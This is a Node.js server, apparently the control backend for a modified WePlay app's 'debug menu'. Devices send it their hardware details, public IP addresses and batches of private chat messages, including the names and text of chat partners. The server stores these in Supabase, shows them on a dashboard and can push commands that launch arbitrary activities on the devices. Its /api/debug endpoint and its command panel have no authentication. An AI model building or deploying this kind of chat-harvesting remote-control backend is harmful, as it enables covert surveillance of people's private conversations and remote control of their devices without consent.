import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";

const port = Number(process.env.PORT || 3000);

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
  console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
  process.exit(1);
}

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SECRET_KEY
);

// Command is still kept in memory for now.
// We can make this persistent later if needed.
let command = {
  title: "MG Menu",
  text: "Server online",
  action: "none",
  activity: ""
};

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(
      req.url || "/",
      `http://${req.headers.host || "localhost"}`
    );

    // Dashboard
    if (req.method === "GET" && url.pathname === "/") {
      return html(res, await renderDashboard());
    }

    // Current command
    if (req.method === "GET" && url.pathname === "/api/data") {
      return json(res, command);
    }

    // Panel command
    if (req.method === "POST" && url.pathname === "/panel/command") {
      const body = await readBody(req);

      command = {
        title: "MG Menu",
        text: String(body.text || "Server online"),
        action: body.activity ? "launch" : "none",
        activity: String(body.activity || "")
      };

      redirect(res, "/");
      return;
    }

    // Device heartbeat
    if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
      const body = await readBody(req);

      const deviceId = clean(body.deviceId);

      if (!deviceId) {
        return json(
          res,
          { ok: false, error: "deviceId required" },
          400
        );
      }

      const now = Date.now();

      const device = {
        device_id: deviceId,
        my_uid: number(body.myUid),
        public_id: clean(body.publicId),
        my_name: clean(body.myName),
        model: clean(body.model),
        brand: clean(body.brand),
        battery_percent: optionalNumber(body.batteryPercent),
        network_type: clean(body.networkType),
        public_ip: publicIp(req),
        client_last_seen: number(body.lastSeen) || now,
        server_last_seen: now,
        created_at: now
      };

      // Do not overwrite original created_at if device already exists.
      const { data: existingDevice, error: findError } = await supabase
        .from("devices")
        .select("created_at")
        .eq("device_id", deviceId)
        .maybeSingle();

      if (findError) {
        console.error("Device lookup error:", findError);

        return json(
          res,
          {
            ok: false,
            error: "database error"
          },
          500
        );
      }

      if (existingDevice?.created_at) {
        device.created_at = existingDevice.created_at;
      }

      const { error: deviceError } = await supabase
        .from("devices")
        .upsert(device, {
          onConflict: "device_id"
        });

      if (deviceError) {
        console.error("Device upsert error:", deviceError);

        return json(
          res,
          {
            ok: false,
            error: "database error"
          },
          500
        );
      }

      return json(res, { ok: true });
    }

    // Chat batch
    if (req.method === "POST" && isChatBatchPath(url.pathname)) {
      const body = await readBody(req);

      const deviceId = clean(body.deviceId);

      if (!deviceId) {
        return json(
          res,
          { ok: false, error: "deviceId required" },
          400
        );
      }

      const list = Array.isArray(body.messages)
        ? body.messages.slice(0, 50)
        : [];

      if (!list.length) {
        return json(res, {
          ok: true,
          inserted: 0,
          skipped: 0
        });
      }

      // Make sure the device exists.
      await ensureDevice(deviceId, body, req);

      const rows = [];
      let skipped = 0;

      for (const raw of list) {
        const mid = clean(raw.mid);

        if (!mid) {
          skipped++;
          continue;
        }

        rows.push({
          device_id: deviceId,
          mid,
          direction: raw.direction === "out" ? "out" : "in",
          peer_uid: number(raw.peerUid),
          peer_name: clean(raw.peerName),
          text: clean(raw.text).slice(0, 500),
          message_time: number(raw.time) || Date.now(),
          received_at: Date.now()
        });
      }

      if (!rows.length) {
        return json(res, {
          ok: true,
          inserted: 0,
          skipped
        });
      }

      // Unique(device_id, mid) prevents duplicate messages.
      const { data: insertedRows, error: messageError } = await supabase
        .from("messages")
        .upsert(rows, {
          onConflict: "device_id,mid",
          ignoreDuplicates: true
        })
        .select("device_id,mid");

      if (messageError) {
        console.error("Message insert error:", messageError);

        return json(
          res,
          {
            ok: false,
            error: "database error"
          },
          500
        );
      }

      const inserted = insertedRows?.length || 0;

      return json(res, {
        ok: true,
        inserted,
        skipped: skipped + (rows.length - inserted)
      });
    }

    // Debug API
    if (req.method === "GET" && url.pathname === "/api/debug") {
      const [devicesResult, messagesResult] = await Promise.all([
        supabase
          .from("devices")
          .select("*")
          .order("server_last_seen", {
            ascending: false
          }),

        supabase
          .from("messages")
          .select("*")
          .order("message_time", {
            ascending: false
          })
          .limit(5000)
      ]);

      if (devicesResult.error) {
        console.error("Debug devices error:", devicesResult.error);

        return json(
          res,
          {
            ok: false,
            error: "database error"
          },
          500
        );
      }

      if (messagesResult.error) {
        console.error("Debug messages error:", messagesResult.error);

        return json(
          res,
          {
            ok: false,
            error: "database error"
          },
          500
        );
      }

      const messagesByDevice = {};

      for (const message of messagesResult.data || []) {
        if (!messagesByDevice[message.device_id]) {
          messagesByDevice[message.device_id] = [];
        }

        messagesByDevice[message.device_id].push(message);
      }

      return json(res, {
        devices: devicesResult.data || [],
        messages: messagesByDevice
      });
    }

    return json(
      res,
      {
        ok: false,
        error: "not found"
      },
      404
    );
  } catch (error) {
    console.error(error);

    return json(
      res,
      {
        ok: false,
        error: "server error"
      },
      500
    );
  }
});

server.listen(port, () => {
  console.log(`MG control server listening on ${port}`);
});


// ---------------------------------------------------------
// Helpers
// ---------------------------------------------------------

async function ensureDevice(deviceId, body, req) {
  const now = Date.now();

  const { data: existing, error: findError } = await supabase
    .from("devices")
    .select("created_at")
    .eq("device_id", deviceId)
    .maybeSingle();

  if (findError) {
    console.error("ensureDevice lookup error:", findError);
    return;
  }

  const device = {
    device_id: deviceId,
    my_uid: number(body.myUid),
    public_id: clean(body.publicId),
    my_name: "",
    model: "",
    brand: "",
    battery_percent: null,
    network_type: "",
    public_ip: publicIp(req),
    client_last_seen: now,
    server_last_seen: now,
    created_at: existing?.created_at || now
  };

  const { error } = await supabase
    .from("devices")
    .upsert(device, {
      onConflict: "device_id"
    });

  if (error) {
    console.error("ensureDevice upsert error:", error);
  }
}

function isHeartbeatPath(pathname) {
  return (
    pathname === "/api/heartbeat" ||
    pathname === "/api/v1/device/heartbeat"
  );
}

function isChatBatchPath(pathname) {
  return (
    pathname === "/api/chat/batch" ||
    pathname === "/api/v1/chat/batch"
  );
}

async function renderDashboard() {
  const { data: deviceListData, error: deviceError } = await supabase
    .from("devices")
    .select("*")
    .order("server_last_seen", {
      ascending: false
    });

  if (deviceError) {
    console.error("Dashboard device error:", deviceError);

    return renderErrorPage(
      "Unable to load devices from database."
    );
  }

  const deviceList = deviceListData || [];

  const { data: messageData, error: messageError } = await supabase
    .from("messages")
    .select("*")
    .order("message_time", {
      ascending: false
    })
    .limit(5000);

  if (messageError) {
    console.error("Dashboard message error:", messageError);

    return renderErrorPage(
      "Unable to load messages from database."
    );
  }

  const allMessages = messageData || [];

  const selectedId =
    deviceList.find((device) =>
      allMessages.some(
        (message) => message.device_id === device.device_id
      )
    )?.device_id ||
    deviceList[0]?.device_id ||
    "";

  const selectedMessages = selectedId
    ? allMessages.filter(
        (message) => message.device_id === selectedId
      )
    : [];

  const totalMessages = allMessages.length;

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>MG Control</title>

  <style>
    :root{color-scheme:dark}

    body{
      margin:0;
      background:#080b10;
      color:#e8eef7;
      font-family:Inter,system-ui,-apple-system,Segoe UI,Arial,sans-serif
    }

    header{
      height:56px;
      display:flex;
      align-items:center;
      justify-content:space-between;
      padding:0 18px;
      border-bottom:1px solid #1f2937;
      background:#0c111a
    }

    h1{font-size:16px;margin:0}
    small{color:#8b98a8}

    main{
      display:grid;
      grid-template-columns:320px 1fr;
      min-height:calc(100vh - 56px)
    }

    aside{
      border-right:1px solid #1f2937;
      background:#0c111a;
      padding:14px
    }

    section{padding:18px}

    .stat{
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:10px;
      margin-bottom:14px
    }

    .box,.device,.panel{
      border:1px solid #1f2937;
      background:#101722;
      border-radius:10px
    }

    .box{padding:12px}
    .box b{font-size:20px}

    .device{
      display:block;
      width:100%;
      text-align:left;
      color:inherit;
      margin-bottom:10px;
      padding:12px;
      box-sizing:border-box
    }

    .dot{
      display:inline-block;
      width:8px;
      height:8px;
      border-radius:50%;
      margin-right:8px;
      background:#64748b
    }

    .on{background:#22c55e}
    .name{font-weight:700}

    .meta{
      font-size:12px;
      color:#94a3b8;
      margin-top:5px
    }

    .panel{
      padding:14px;
      margin-bottom:14px
    }

    input,textarea,button{
      width:100%;
      box-sizing:border-box;
      border-radius:8px;
      border:1px solid #273449;
      background:#0b1018;
      color:#eef2f8;
      padding:10px;
      margin-top:8px
    }

    button{
      background:#e5e7eb;
      color:#111827;
      font-weight:700;
      cursor:pointer
    }

    table{
      width:100%;
      border-collapse:collapse
    }

    .table{overflow:auto}

    th,td{
      text-align:left;
      border-bottom:1px solid #1f2937;
      padding:10px;
      font-size:13px;
      vertical-align:top
    }

    th{
      color:#94a3b8;
      font-weight:600
    }

    .msg-in{color:#93c5fd}
    .msg-out{color:#86efac}

    .empty{
      border:1px dashed #293548;
      border-radius:10px;
      padding:30px;
      text-align:center;
      color:#64748b
    }

    .error{
      border:1px solid #7f1d1d;
      background:#1c0b0b;
      color:#fecaca;
      padding:20px;
      border-radius:10px
    }

    @media(max-width:800px){
      main{grid-template-columns:1fr}
      aside{
        border-right:0;
        border-bottom:1px solid #1f2937
      }
    }
  </style>
</head>

<body>

<header>
  <div>
    <h1>MG Control</h1>
    <small>Render receiver for WePlay debug menu</small>
  </div>

  <small>${esc(new Date().toLocaleString())}</small>
</header>

<main>

<aside>

  <div class="stat">
    <div class="box">
      <small>Devices</small><br>
      <b>${deviceList.length}</b>
    </div>

    <div class="box">
      <small>Messages</small><br>
      <b>${totalMessages}</b>
    </div>
  </div>

  ${
    deviceList.length
      ? deviceList.map(renderDevice).join("")
      : `<div class="empty">No devices yet</div>`
  }

</aside>

<section>

  <div class="panel">

    <b>Menu Command</b>

    <form method="post" action="/panel/command">

      <textarea
        name="text"
        rows="2"
        placeholder="Status text"
      >${esc(command.text)}</textarea>

      <input
        name="activity"
        placeholder="Activity class optional"
        value="${esc(command.activity)}"
      >

      <button>Save command</button>

    </form>

  </div>

  <div class="panel">

    <b>Latest Messages</b>

    ${
      selectedMessages.length
        ? renderMessages(
            selectedMessages
              .slice()
              .reverse()
              .slice(0, 200)
          )
        : `<div class="empty">No messages yet</div>`
    }

  </div>

</section>

</main>

</body>
</html>`;
}

function renderDevice(device) {
  const online =
    Date.now() - Number(device.server_last_seen) < 60_000;

  const displayName =
    device.my_name ||
    device.public_id ||
    (device.my_uid ? `UID ${device.my_uid}` : device.device_id);

  return `
<div class="device">

  <div>
    <span class="dot ${online ? "on" : ""}"></span>
    <span class="name">${esc(displayName)}</span>
  </div>

  <div class="meta">
    ${esc(device.brand || "")}
    ${esc(device.model || "")}
    |
    ${esc(device.network_type || "")}
    |
    ${device.battery_percent ?? "?"}%
  </div>

  <div class="meta">
    UID ${esc(device.my_uid)}
    ${
      device.public_id
        ? `| ${esc(device.public_id)}`
        : ""
    }
  </div>

  <div class="meta">
    ${esc(device.public_ip || "")}
    |
    ${ago(device.server_last_seen)}
  </div>

  <div class="meta">
    ${esc(device.device_id)}
  </div>

</div>`;
}

function renderMessages(messages) {
  return `
<div class="table">

<table>

<thead>
<tr>
  <th>Time</th>
  <th>Peer</th>
  <th>Dir</th>
  <th>Text</th>
  <th>MID</th>
</tr>
</thead>

<tbody>

${messages
  .map(
    (m) => `
<tr>

<td>
${esc(new Date(Number(m.message_time)).toLocaleString())}
</td>

<td>
${esc(
  m.peer_name ||
  (m.peer_uid ? `UID ${m.peer_uid}` : "")
)}
</td>

<td class="${
      m.direction === "out"
        ? "msg-out"
        : "msg-in"
    }">
${esc(m.direction)}
</td>

<td>
${esc(m.text)}
</td>

<td>
<small>${esc(m.mid)}</small>
</td>

</tr>`
  )
  .join("")}

</tbody>

</table>

</div>`;
}

function renderErrorPage(message) {
  return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MG Control Error</title>
<style>
body{
  margin:0;
  padding:30px;
  background:#080b10;
  color:#e8eef7;
  font-family:system-ui
}
.error{
  border:1px solid #7f1d1d;
  background:#1c0b0b;
  color:#fecaca;
  padding:20px;
  border-radius:10px
}
</style>
</head>
<body>
<div class="error">${esc(message)}</div>
</body>
</html>`;
}

async function readBody(req) {
  const chunks = [];

  for await (const chunk of req) {
    chunks.push(chunk);
  }

  const raw = Buffer.concat(chunks).toString("utf8");

  if (!raw) {
    return {};
  }

  const type = req.headers["content-type"] || "";

  if (
    String(type).includes(
      "application/x-www-form-urlencoded"
    )
  ) {
    return Object.fromEntries(
      new URLSearchParams(raw)
    );
  }

  try {
    return JSON.parse(raw);
  } catch {
    return {};
  }
}

function json(res, payload, status = 200) {
  const body = JSON.stringify(payload);

  res.writeHead(status, {
    "content-type":
      "application/json; charset=utf-8",
    "cache-control": "no-store"
  });

  res.end(body);
}

function html(res, body) {
  res.writeHead(200, {
    "content-type":
      "text/html; charset=utf-8",
    "cache-control": "no-store"
  });

  res.end(body);
}

function redirect(res, location) {
  res.writeHead(302, {
    location
  });

  res.end();
}

function publicIp(req) {
  const forwarded =
    req.headers["x-forwarded-for"];

  if (
    typeof forwarded === "string" &&
    forwarded
  ) {
    return forwarded
      .split(",")[0]
      .trim();
  }

  return req.socket.remoteAddress || "";
}

function clean(value) {
  return value == null
    ? ""
    : String(value);
}

function number(value) {
  const n = Number(value);

  return Number.isFinite(n)
    ? n
    : 0;
}

function optionalNumber(value) {
  const n = Number(value);

  return Number.isFinite(n)
    ? n
    : null;
}

function esc(value) {
  return clean(value).replace(
    /[&<>"']/g,
    (char) =>
      ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      }[char])
  );
}

function ago(time) {
  const diff = Math.max(
    0,
    Date.now() - Number(time)
  );

  if (diff < 60_000) {
    return `${Math.floor(diff / 1000)}s ago`;
  }

  if (diff < 3_600_000) {
    return `${Math.floor(diff / 60_000)}m ago`;
  }

  return `${Math.floor(diff / 3_600_000)}h ago`;
}
